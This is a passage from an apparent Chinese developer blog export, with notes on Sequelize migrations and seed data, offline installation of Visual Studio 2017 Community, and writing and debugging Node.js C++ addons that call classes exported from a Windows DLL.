Role.associate = function(models) &#123; // associations can be defined here Role.hasMany(models.User) &#125;; return Role;&#125;; 修改models/user.js如下：123456789101112131415161718&apos;use strict&apos;;module.exports = (sequelize, DataTypes) =&gt; &#123; var User = sequelize.define(&apos;User&apos;, &#123; firstName: DataTypes.STRING, lastName: DataTypes.STRING, email: DataTypes.STRING &#125;, &#123;&#125;); User.associate = function(models) &#123; // associations can be defined here User.belongsTo(models.Role, &#123; onDelete: &quot;NULL&quot;, foreignKey: &#123; allowNull: false &#125; &#125;) &#125;; return User;&#125;; 修改和运行迁移Role和User是一对多的关系，因此需要修改User迁移文件的定义。修改migrates/20180622153152-create-user.js如下：12345678910111213141516171819202122232425262728293031323334353637383940414243&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.createTable(&apos;Users&apos;, &#123; id: &#123; allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER &#125;, roleId: &#123; // name of the key we&apos;re adding type: Sequelize.INTEGER, allowNull: false, references: &#123; model: &apos;Roles&apos;, // name of Target model key: &apos;id&apos;, // key in Target model that we&apos;re referencing &#125;, onUpdate: &apos;CASCADE&apos;, onDelete: &apos;CASCADE&apos;, &#125;, firstName: &#123; type: Sequelize.STRING &#125;, lastName: &#123; type: Sequelize.STRING &#125;, email: &#123; type: Sequelize.STRING &#125;, createdAt: &#123; allowNull: false, type: Sequelize.DATE &#125;, updatedAt: &#123; allowNull: false, type: Sequelize.DATE &#125; &#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.dropTable(&apos;Users&apos;); &#125;&#125;; 注意：这里主要给User添加了外键字段，外键字段命名有规则：通常为小写的模型名加Id，即驼峰风格。例如这里加了roleId的外键字段。 直到目前为止，CLI没有将任何东西插入数据库。 刚刚为模型 User和Role创建了必需的模型和迁移文件。 现在要在数据库中实际创建该表，需要运行 db:migrate 命令。1../node_modules/.bin/sequelize db:migrate 此命令将执行这些步骤： 将在数据库中创建一个名为 SequelizeMeta 的表。 此表用于记录在当前数据库上运行的迁移 开始寻找尚未运行的任何迁移文件。 这可以通过检查 SequelizeMeta 表。 在这个例子中，它将运行创建的 XXXXXXXXXXXXXX-create-role.js和XXXXXXXXXXXXXX-create-user.js 迁移。 创建一个名为 Roles 的表，其中包含其迁移文件中指定的所有列。 创建一个名为 Users 的表，其中包含其迁移文件中指定的所有列。 除了使用sequelize db:migrate命令创建数据库表之外，可以使用models同步创建或删除数据库表，例如： 123456789101112131415161718192021222324252627282930if (appConfig.dbCreated === false) &#123; models.sequelize.sync().then(function() &#123; //保存应用配置 appConfig.dbCreated = true; fs.writeFile(__dirname + &apos;/../config/appConfig.json&apos;, JSON.stringify(appConfig), function(err) &#123; if (err) return console.error(err); console.log(&apos;app config save is done&apos;); &#125;); Promise.all([ models.T_Role.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Role_Name:&apos;管理员&apos;&#125;), models.T_User.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Account:appConfig.adminAccount,Password:pwdHash.createHash(appConfig.adminPassword),Audit:true,Avatar:&apos;/avatar/default.jpg&apos;&#125;), models.T_Role.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Role_Name:&apos;普通用户&apos;&#125;) ]).then(function (result)&#123; //console.log(result); var role1=result[0]; var user1=result[1]; role1.setT_Users(user1).catch(err=&gt;console.log(err)); &#125;).catch(err=&gt;console.log(err)); server.listen(port); server.on(&apos;error&apos;, onError); server.on(&apos;listening&apos;, onListening); &#125;);&#125; else &#123; server.listen(port); server.on(&apos;error&apos;, onError); server.on(&apos;listening&apos;, onListening);&#125; 创建种子，生成测试数据假设我们希望在默认情况下将一些数据插入到几个表中。 例如创建几个用户和角色：12../node_modules/.bin/sequelize seed:generate --name demo-role../node_modules/.bin/sequelize seed:generate --name demo-user 这个命令将会在 seeders 文件夹中创建两个种子文件。文件名看起来像是 XXXXXXXXXXXXXX-demo-role.js和XXXXXXXXXXXXXX-demo-user.js，它遵循相同的 up/down 语义，如迁移文件。 现在我们应该编辑这两个文件，将演示角色插入Role表,将演示用户插入User表。修改XXXXXXXXXXXXXX-demo-role.js如下：123456789101112131415161718192021&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkInsert(&apos;Roles&apos;, [&#123; roleName: &apos;管理员&apos;, createdAt:new Date(), updatedAt:new Date() &#125;,&#123; roleName: &apos;普通用户&apos;, createdAt:new Date(), updatedAt:new Date() &#125;], &#123;&#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkDelete(&apos;Roles&apos;, null, &#123;&#125;); &#125;&#125;; 修改XXXXXXXXXXXXXX-demo-user.js如下：1234567891011121314151617181920212223242526&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkInsert(&apos;Users&apos;, [&#123; roleId:1, firstName: &apos;John&apos;, lastName: &apos;Doe&apos;, email: &apos;demo@demo.com&apos;, createdAt:new Date(), updatedAt:new Date() &#125;,&#123; roleId:1, firstName: &apos;Jack&apos;, lastName: &apos;Smith&apos;, email: &apos;jack@demo.com&apos;, createdAt:new Date(), updatedAt:new Date() &#125;], &#123;&#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkDelete(&apos;Users&apos;, null, &#123;&#125;); &#125;&#125;; 种子文件修改后，即可使用如下命令将演示数据插入数据库中：1../node_modules/.bin/sequelize db:seed:all 工程实践经验总结在工程实践中，只需使用sequelize-cli创建数据库，生成models即可，然后使用代码直接根据models创建数据库表，并生成测试数据。 参考链接 Sequelize Reference，by sequelizejs. Sequelize 中文文档，by demopark. 解决Mysql中文乱码问题, by 最怕认真. How to set primary key type to UUID via Sequelize CLI,by stackoverflow. 数据库表主键设计方法,by jackhuang. Variable,by sequelize.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Visual_Studio_Community_2017离线安装]]></title>
    <url>%2F2018%2F06%2F21%2FVisual-Studio-Community-2017%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Visual Studio 2017版本采用模块化安装方式，根据用户选择模块按需安装。这种方式在用户能够上网的情况下十分方便，但在离线情况下就无法使用。下面介绍在离线情况下如何打包安装Visual Studio community 2017的方法。 下载VS2017社区版安装包获取程序到官网下载最新版本的vs_community_xxxxxx.exe的下载器。 运行命令下载所需安装包运行如下命令获取VS2017的工作负载：1.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --includeOptional 可从参考链接[2]中获取工作负载ID。如需更多语言包或者更多安装指令，请参考官方离线安装命令指南，即参考链接[3]。 VS2017社区版 30天许可证过期解决方法解决方法步骤如下： 外网电脑打开Vistual Studio Community2017。 在许可证过期弹窗中登陆即可自动下载许可证完成激活。许可证下载路径（C:\Users\user\AppData\Local\Microsoft\VSCommon\OnlineLicensing） 拷贝外网中的OnlineLicensing文件夹到内网电脑相应路径下（C:\Users\user\AppData\Local\Microsoft\VSCommon） 打开内网电脑Vistual Studio Community2017将不会再弹出许可证到期窗口。 参考链接 Create an offline installation of Visual Studio, by microsoft Visual Studio Community 组件目录, by microsoft Use command-line parameters to install Visual Studio, by microsoft Vistual Studio Community 2017 30天许可证过期,by 井底一蛤蟆.]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node_C++_Addon插件编写方法]]></title>
    <url>%2F2018%2F06%2F20%2FNode-Addon%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[最近研究在Nodejs中调用DLL，上网搜索发现主要有两种方法： 使用Nodeffi调用C风格接口的DLL，但是无法调用C++风格导出类的DLL。 使用Nodejs C++ Addon 插件，该方法可直接与C++代码交互，理论上可以调用C++风格导出类的DLL。 下面研究Nodejs Addon C++插件的编写方法。 什么是Nodejs C++ AddonNode.js插件（Addons）是C/C++编写的动态链接对象，这些对象可以被Node.js的require()函数引用，并可以像普通的Node.js模块一样使用。Addons主要用于提供一个Node.js中运行的JavaScript和C/C++库之间的接口。 插件（Addons）是动态链接的共享对象，它提供了C/C++类库的调用能力。实现插件的方法比较复杂，涉及到以下元组件及API: V8：C++库，Node.js用于提供JavaScript执行环境。V8提供了对象创建、函数调用等执行机制，V8相关API包含在了v8.h头文件中（位于Node.js源码树的deps/v8/include/v8.h），也可以查看在线文档。 libuv：C库，实现了Node.js中的事件循环、工作线程及在不同平台中异步行为的相关功能。也可以做为是一个跨平台的抽象库，提供了简单的、类POSIX的对主要操作系统的常见系统任务功能，如：与文件系统、套接字、计时器、系统事件的交互等。libuv还提供了一个类pthreads的线程池抽象对象，可用于更复杂的、超越标准事件循环的异步插件的控制功能。 内部Node.js库：Node.js自身提供了一定义数量的C/C++API的插件可以使用 - 其中最重要的可能是node::ObjectWrap类 Node.js静态链接库：Node.js自身还包含了一部分静态链接库，如OpenSSL。这些位于Node.js源码树的deps/目录下，只有V8和OpenSSL提供了符号出口，可以供Node.js和基它插件所使用。详见Node.js依赖链接 Node Addon插件编写方法Node Addon插件的编写需要解决两个关键问题： 当数据流向 javaScript -&gt; C++时，如何将javascript类型数据包装成C++类型数据，供C++代码使用。 当数据流向 C++ -&gt; JavaScript时，如何将C++类型数据包装成JavaScript类型数据，供JavaScript代码使用。 这两个关键问题的分析请参见淘宝前端团队成员发表的文章“Node.js 和 C++ 之间的类型转换[3]”。解决这两个关键问题后，Node Addon插件编写难度就不大了。 Node Addon插件调用C++导出类DLL方法测试现有一个采用成熟方法导出类接口的DLL[4]，如何在Node Addon插件中调用该DLL呢?下面nodejs官网Node Addon插件例子Factory of wrapped objects为例进行讲解。 Factory of wrapped objects例子在Addon插件中包装了一个MyObject类，现在就在MyObject类调用DLL导出类的接口方法。修改MyObject.h代码，增加DLL导出类接口方法，增加类接口成员变量IExport和DLL句柄变量hDll，如下所示：123456789101112131415161718192021222324252627282930313233343536// myobject.h#ifndef MYOBJECT_H#define MYOBJECT_H#include &lt;node.h&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;node_object_wrap.h&gt;#include &quot;MatureApproach.h&quot;namespace demo &#123;typedef IExport*(*TYPE_fnCreateExportObj) (void);//定义函数指针 typedef void(*TYPE_fnDestroyExportObj) (IExport*);//定义函数指针 class MyObject : public node::ObjectWrap &#123; public: static void Init(v8::Isolate* isolate); static void NewInstance(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); private: explicit MyObject(double value = 0); ~MyObject(); static void New(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void PlusOne(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void Hi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void Test(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static v8::Persistent&lt;v8::Function&gt; constructor; HMODULE hDll; IExport* pExport; double value_;&#125;;&#125; // namespace demo#endif 接下来将在MyObject类的构造函数中动态加载DLL，创建DLL导出类对象，在析构函数中析构DLL导出类对象，动态卸载DLL,在MyObject成员方法中调用DLL导出类方法，代码如下所示：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// myobject.cc#include &lt;node.h&gt;#include &quot;myobject.h&quot;namespace demo &#123;using v8::Context;using v8::Function;using v8::FunctionCallbackInfo;using v8::FunctionTemplate;using v8::Isolate;using v8::Local;using v8::Number;using v8::Object;using v8::Persistent;using v8::String;using v8::Value;Persistent&lt;Function&gt; MyObject::constructor;MyObject::MyObject(double value) : value_(value)&#123; MyObject::hDll = LoadLibrary(&quot;MatureApproach.dll&quot;); //加载动态链接库DllDemo.dll文件； TYPE_fnCreateExportObj fnCreateExportObj = (TYPE_fnCreateExportObj)GetProcAddress(MyObject::hDll, &quot;CreateExportObj&quot;); MyObject::pExport = fnCreateExportObj();&#125;MyObject::~MyObject() &#123; TYPE_fnDestroyExportObj fnDestroyExportObj = (TYPE_fnDestroyExportObj)GetProcAddress(MyObject::hDll, &quot;DestroyExportObj&quot;); fnDestroyExportObj(MyObject::pExport); FreeLibrary(MyObject::hDll);&#125;void MyObject::Init(Isolate* isolate) &#123; // Prepare constructor template Local&lt;FunctionTemplate&gt; tpl = FunctionTemplate::New(isolate, New); tpl-&gt;SetClassName(String::NewFromUtf8(isolate, &quot;MyObject&quot;)); tpl-&gt;InstanceTemplate()-&gt;SetInternalFieldCount(3); // Prototype NODE_SET_PROTOTYPE_METHOD(tpl, &quot;plusOne&quot;, PlusOne); NODE_SET_PROTOTYPE_METHOD(tpl, &quot;hi&quot;, Hi); NODE_SET_PROTOTYPE_METHOD(tpl, &quot;test&quot;, Test); constructor.Reset(isolate, tpl-&gt;GetFunction());&#125;void MyObject::New(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); if (args.IsConstructCall()) &#123; // Invoked as constructor: `new MyObject(...)` double value = args[0]-&gt;IsUndefined() ? 0 : args[0]-&gt;NumberValue(); MyObject* obj = new MyObject(value); obj-&gt;Wrap(args.This()); args.GetReturnValue().Set(args.This()); &#125; else &#123; // Invoked as plain function `MyObject(...)`, turn into construct call. const int argc = 1; Local&lt;Value&gt; argv[argc] = &#123; args[0] &#125;; Local&lt;Function&gt; cons = Local&lt;Function&gt;::New(isolate, constructor); Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext(); Local&lt;Object&gt; instance = cons-&gt;NewInstance(context, argc, argv).ToLocalChecked(); args.GetReturnValue().Set(instance); &#125;&#125;void MyObject::NewInstance(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); const unsigned argc = 1; Local&lt;Value&gt; argv[argc] = &#123; args[0] &#125;; Local&lt;Function&gt; cons = Local&lt;Function&gt;::New(isolate, constructor); Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext(); Local&lt;Object&gt; instance = cons-&gt;NewInstance(context, argc, argv).ToLocalChecked(); args.GetReturnValue().Set(instance);&#125;void MyObject::PlusOne(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); obj-&gt;value_ += 1; args.GetReturnValue().Set(Number::New(isolate, obj-&gt;value_));&#125;void MyObject::Hi(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); Local&lt;String&gt; str=v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Hi().data()); args.GetReturnValue().Set(str);&#125;void MyObject::Test(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); Local&lt;String&gt; str=v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Test().data()); args.GetReturnValue().Set(str);&#125;&#125; // namespace demo 参考链接 Node.js C/C++插件（Addons）, by IT笔录 Node.js v8.16.1 Documentation，by nodejs type-casts-between-node-and-cpp，by 淘宝前端团队 DLL导出类和函数,by jackhuang]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在Vistual_Studio中调试Node_Addon_C++插件]]></title>
    <url>%2F2018%2F06%2F18%2F%E5%A6%82%E4%BD%95%E5%9C%A8Vistual-Studio%E4%B8%AD%E8%B0%83%E8%AF%95Node-Addon-C-%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[最近研究如何在Vistual Studio 2017社区版中调试Node addon C++插件，遇到很多问题，花费了不少时间，为防止遗忘，将方法记录下来。 准备工作 安装VS2017社区版 安装python 2.7 安装Nodejs 8.11.3 LTS 下载Nodejs 8.11.3 LTS源码 安装配置环境 安装node-gyp和nannode-gyp和nan用于编译生成node addon 插件。 12npm install -g node-gypnpm install -g nan 编译nodejs源码在nodejs源码解压后文件夹中执行如下命令： 1.\vcbuild.bat debug x64 创建nodejs addon c++插件示例工程使用如下命名生成调试用的vs工程： 1node-gyp configure rebuild --nodedir=&quot;D:\project\cpp_project\node-v8.11.3&quot; --debug 修改测试用的index.js,使其调用上一步骤生成的调试用的插件 //该js调用生成的插件 var addon = require(&#39;./build/Debug/max&#39;); var y=addon.max(2,3); console.log(y); 使用VS2017打开插件示例工程的build文件夹下node-gyp生成的解决方案。右键单击工程，在上下文菜单中点击属性，配置其调试命令和命令参数，如下图所示。 设置断点进行调试 参考链接 如何在VS2015中搭建可以写node.js的C++Addon的环境, by Zmyths. how-to-debug-nodejs-addons-in-visual-studio,by cvtalks. Vistual Studio Community 2017 30天许可证过期,by 井底一蛤蟆.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DLL导出类和函数]]></title>
    <url>%2F2018%2F06%2F15%2FDLL%E5%AF%BC%E5%87%BA%E7%B1%BB%E5%92%8C%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[最近研究在DLL中导出类，探寻最佳的DLL导出类的方法和技术。把整个过程记录一下，防止遗忘。 基础知识动态链接库动态链接库（英语：Dynamic-link library，缩写为DLL）是微软公司在微软视窗操作系统中实现共享函数库概念的一种实现方式。这些库函数的扩展名是.DLL、.OCX（包含ActiveX控制的库）或者.DRV（旧式的系统驱动程序)。 所谓动态链接，就是把一些经常会共用的代码（静态链接的OBJ程序库）制作成DLL档，当可执行文件调用到DLL档内的函数时，Windows操作系统才会把DLL档加载存储器内，DLL档本身的结构就是可执行档，当程序有需求时函数才进行链接。通过动态链接方式，存储器浪费的情形将可大幅降低。静态链接库则是直接链接到可执行文件。 编写方法使用DLL导出C函数或全局变量很简单，具体代码如下：12345678910111213141516171819// 下列 ifdef 块是创建使从 DLL 导出更简单的// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 DLLDEMO_EXPORTS// 符号编译的。在使用此 DLL 的// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将// DLLDEMO_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的// 符号视为是被导出的。#ifdef DLLDEMO_EXPORTS#define DLLDEMO_API __declspec(dllexport)#else#define DLLDEMO_API __declspec(dllimport)#endifextern &quot;C&quot; extern DLLDEMO_API int nDllDemo;//不使用extern &quot;C&quot;将导致函数名字改编DLLDEMO_API int fnDllDemo(int);extern &quot;C&quot; DLLDEMO_API int fnExternCDllDemo(int); 运行时通知DLL进程/线程加载进程/线程加载时，可以通过DllMain函数通知DLL相关信息，提供对应处理的机会。12345678910111213141516171819BOOL WINAPI DLLMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID fImpLoad)&#123; switch(fdwReason) &#123; case DLL_PROCESS_ATTACH: //当这个DLL第一次被映射到了这个进程的地址空间时。DLLMain函数的返回值为FALSE，说明DLL的初始化没有成功，系统就会终结整个进程，去掉所有文件映象，之后显示一个对话框告诉用户进程不能启动。 break; case DLL_THREAD_ATTACH: //一个线程被创建，新创建的线程负责执行这次的DllMain函数。系统不会让进程已经存在的线程以DLL_THREAD_ATTACH的值来调用DllMain函数。主线程永远不会以DLL_THREAD_ATTACH的值来调用DllMain函数。系统是顺序调用DllMain函数的，一个线程执行完DllMain函数才会让另外一个线程执行DllMain函数。 break; case DLL_THREAD_DETACH: //如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread）。线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。 break; case DLL_PROCESS_DETACH: //这个DLL从进程的地址空间中解除映射。如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。 break; &#125; return(TRUE);&#125; DLL的静态调用方法采用静态调用方法，DLL最终将打包到生成的EXE中。静态调用方法步骤如下[2]： 把你的youApp.DLL拷到你目标工程(需调用youApp.DLL的工程)的Debug目录下; 把你的youApp.lib拷到你目标工程(需调用youApp.DLL的工程)目录下; 把你的youApp.h(包含输出函数的定义)拷到你目标工程(需调用youApp.DLL的工程)目录下; 打开你的目标工程选中工程,选择Visual C++的Project主菜单的Settings菜单; 执行第4步后，VC将会弹出一个对话框，在对话框的多页显示控件中选择Link页。然后在Object/library modules输入框中输入:youApp.lib 选择你的目标工程Head Files加入：youApp.h文件; 最后在你目标工程(*.cpp,需要调用DLL中的函数)中包含你的:#include “youApp.h” DLL的动态调用方法动态调用DLL的步骤： 创建一个函数指针，其指针数据类型要与调用的DLL引出函数相吻合。 通过Win32 API函数LoadLibrary()显式的调用DLL，此函数返回DLL的实例句柄。 通过Win32 API函数GetProcAddress()获取要调用的DLL的函数地址, 把结果赋给自定义函数的指针类型。 使用函数指针来调用DLL函数。 最后调用完成后，通过Win32 API函数FreeLibrary()释放DLL函数。 123456789101112131415161718192021222324int main()&#123; HMODULE hModule = LoadLibrary(_T(&quot;DllDemo.dll&quot;)); typedef int(*TYPE_fnDllDemo) (int);//定义函数指针 typedef int(*TYPE_fnExternCDllDemo) (int);//定义函数指针 //创建类对象 CDllDemo* pCDllDemo = (CDllDemo*)malloc(sizeof(CDllDemo)); TYPE_fnDllDemo fnDllDemo = (TYPE_fnDllDemo)GetProcAddress(hModule, &quot;?fnDllDemo@@YAHH@Z&quot;); int *nDllDemo = (int *)GetProcAddress(hModule, &quot;nDllDemo&quot;); TYPE_fnExternCDllDemo fnExternCDllDemo = (TYPE_fnExternCDllDemo)GetProcAddress(hModule, &quot;fnExternCDllDemo&quot;); if (pCDllDemo != NULL) // printf(&quot;pCDllDemo-&gt;Max(32,42) = %d\n&quot;, pCDllDemo-&gt;Max(32, 42));//Dll导出类的调用太麻烦，因为DLL本来就是为C函数服务设计的。 if (fnDllDemo != NULL) printf(&quot;fnDllDemo(32) = %d\n&quot;, fnDllDemo(32)); if (nDllDemo != NULL) printf(&quot;*nDllDemo = %d\n&quot;, *nDllDemo); if (fnExternCDllDemo != NULL) printf(&quot;fnExternCDllDemo(22) = %d\n&quot;, fnExternCDllDemo(22)); _tsystem(_T(&quot;pause&quot;)); FreeLibrary(hModule); return 0;&#125; COM技术COM主要是一套给C/C++用的接口，当然为了微软的野心，它也被推广到了VB、Delphi以及其他一大堆奇奇怪怪的平台上。它主要为了使用dll发布基于interface的接口。我们知道dll的接口是为了C设计的，它导出的基本都是C的函数，从原理上来说，将dll加载到内存之后，会告诉你一组函数的地址，你自己call进去就可以调用相应的函数[3]。 但是对于C++来说这个事情就头疼了，现在假设你有一个类，我们知道使用一个类的第一步是创建这个类：new MyClass()。这里直接就出问题了，new方法通过编译器计算MyClass的大小来分配相应的内存空间，但是如果库升级了，相应的类可能会增加新的成员，大小就变了，那么使用旧的定义分配出来的空间就不能在新的库当中使用。 要解决这问题，我们必须在dll当中导出一个CreateObject的方法，用来代替构造函数，然后返回一个接口。然而，接口的定义在不同版本当中也是有可能会变化的，为了兼容以前的版本同时也提供新功能，还需要让这个对象可以返回不同版本的接口。接口其实是一个只有纯虚函数的C++类，不过对它进行了一些改造来兼容C和其他一些编程语言。 在这样改造之后，出问题的还有析构过程~MyClass()或者说delete myClass，因为同一个对象可能返回了很多个接口，有些接口还在被使用，如果其中一个被人delete了，其他接口都会出错，所以又引入了引用计数，来让许多人可以共享同一个对象。 其实到此为止也并不算是很奇怪的技术，我们用C++有的时候也会使用Factory方法来代替构造函数实现某些特殊的多态，也会用引用计数等等。COM技术的奇怪地方在于微软实在是脑洞太大了，它们构造了一个操作系统级别的Factory，规定所有人的Interface都统一用UUID来标识，以后想要哪个Interface只要报出UUID来就行了。这样甚至连链接到特定的dll都省了。 这就好比一个COM程序员，只要他在Windows平台上，调用别的库就只要首先翻一下魔导书，查到了一个用奇怪文字写的“Excel = {xxx-xxx-xxxx…}”的记号，然后它只要对着空中喊一声：“召唤，Excel！CoCreateInstance, {xxx-xxx-xxxx…}”然后呼的从魔法阵里面窜出来了一个怪物，它长什么样我们完全看不清，因为这时候它的类型是IUnknow，这是脑洞奇大无比的微软为所有接口设计的一个基类。 我们需要进一步要求它变成我们能控制的接口形态，于是我们再喊下一条指令：“变身，Excel 2003形态！QueryInterface, {xxx-xxx-xxxx…}”QueryInterface使用的是另一个UUID，用来表示不同版本的接口。于是怪物就变成了我们需要的Excel 2003接口，虽然我们不知道它实际上是2003还是2007还是更高版本。等我们使唤完这只召唤兽，我们就会对它说“回去吧，召唤兽！Release！”但是它不一定听话，因为之前给它的命令也许还没有执行完，它会忠诚地等到执行完再回去，当然我们并不关心这些细节。 微软大概会觉得自己设计出了软件史上最完美的二进制接口，从今以后所有的第三方库都可以涵盖在这套接口之下。然而历史的车轮是无情的，它碾过那些自以为是的人的速度总是会比想象的更快。Java的直接基于类的接口被广泛应用，开发使用起来远远来的简单，即便偶尔出点问题大家也都想办法解决了，事实证明程序员并不愿意花10倍的编写代码的时间来解决二进制库的版本兼容问题，他们更愿意假装没看见。很快微软也抄了一个.NET托管dll的方案出来，于是纯的二进制接口COM就慢慢被抛弃了。 COM，OLE，ActiveX，OCX，VBScript，历史不会忘记你们的，如果历史忘了，我替历史记住你们。安息吧。 DLL导出类借鉴COM技术，这里直接给出DLL到处类的成熟方法，可有效避免DLL地狱问题。具体结构为： 导出类是一个派生类，派生自一个抽象类——都是纯虚函数。使用者需要知道这个抽象类的结构。DLL最少只需要提供一个用于获取类对象指针的接口。使用者跟DLL提供者共用一个抽象类的头文件，使用者依赖于DLL的东西很少，只需要知道抽象类的接口，以及获取对象指针的导出函数，对象内存空间的申请是在DLL模块中做的，释放也在DLL模块中完成,最后记得要调用释放对象的函数。 这种方式比较好，通用，产生的DLL没有特定环境限制。借助了C++类的虚函数。一般都是采用这种方式。除了对DLL导出类有好处外，采用接口跟实现分离，可以使得工程的结构更清晰，使用者只需要知道接口，而不需要知道实现。 具体代码如下： DLL导出类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//DLL导出类头文件MatureApproach.h，与DLL使用者共享#ifdef MATUREAPPROACH_EXPORTS#define MATUREAPPROACH_API __declspec(dllexport)#else#define MATUREAPPROACH_API __declspec(dllimport)#endifclass IExport &#123;public: virtual void Hi() = 0; virtual void Test() = 0; virtual void Release() = 0;&#125;;extern &quot;C&quot; MATUREAPPROACH_API IExport* _stdcall CreateExportObj();extern &quot;C&quot; MATUREAPPROACH_API void _stdcall DestroyExportObj(IExport* pExport);//DLL导出接口函数的实现MatureApproach.cpp#include &quot;stdafx.h&quot;#include &quot;MatureApproach.h&quot;#include &quot;ExportClassImpl.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;MATUREAPPROACH_API IExport* APIENTRY CreateExportObj()&#123; return new ExportImpl;&#125;//这里不能直接delete pExport，因为没有把IExport的析构函数定义为虚函数MATUREAPPROACH_API void APIENTRY DestroyExportObj(IExport* pExport)&#123; pExport-&gt;Release();&#125; DLL导出类的具体实现 123456789101112131415161718192021222324252627282930313233343536//DLL导出类头文件ExportClassImpl.h#include &quot;MatureApproach.h&quot;class ExportImpl : public IExport&#123;public: virtual void Hi(); virtual void Test(); virtual void Release(); ~ExportImpl();private:&#125;;//DLL导出类的实现ExportClassImpl.cpp#include &quot;stdafx.h&quot;#include &quot;ExportClassImpl.h&quot;void ExportImpl::Hi()&#123; wcout &lt;&lt; L&quot;Hello World&quot; &lt;&lt; endl;&#125;void ExportImpl::Test()&#123; wcout &lt;&lt; L&quot;Hi cswuyg&quot; &lt;&lt; endl;&#125;void ExportImpl::Release()&#123; delete this;&#125;ExportImpl::~ExportImpl()&#123; cout &lt;&lt; &quot;Release OK&quot; &lt;&lt; endl;&#125; 参考链接 动态链接库, by wikipedia C++调用DLL有两种方法——静态调用和动态调用，by 特洛伊-Micro 怎么通俗的解释COM组件？, by 灵剑. 编写DLL所学所思(2)——导出类，by 烛秋. Visibility,by Niall Douglas. Linux 編譯 shared library 的方法和注意事項,by fcamel. GCC制作Library—shared部分相当不错,by kk.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium卫星地图和高程数据切片经验总结]]></title>
    <url>%2F2018%2F06%2F13%2FCesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
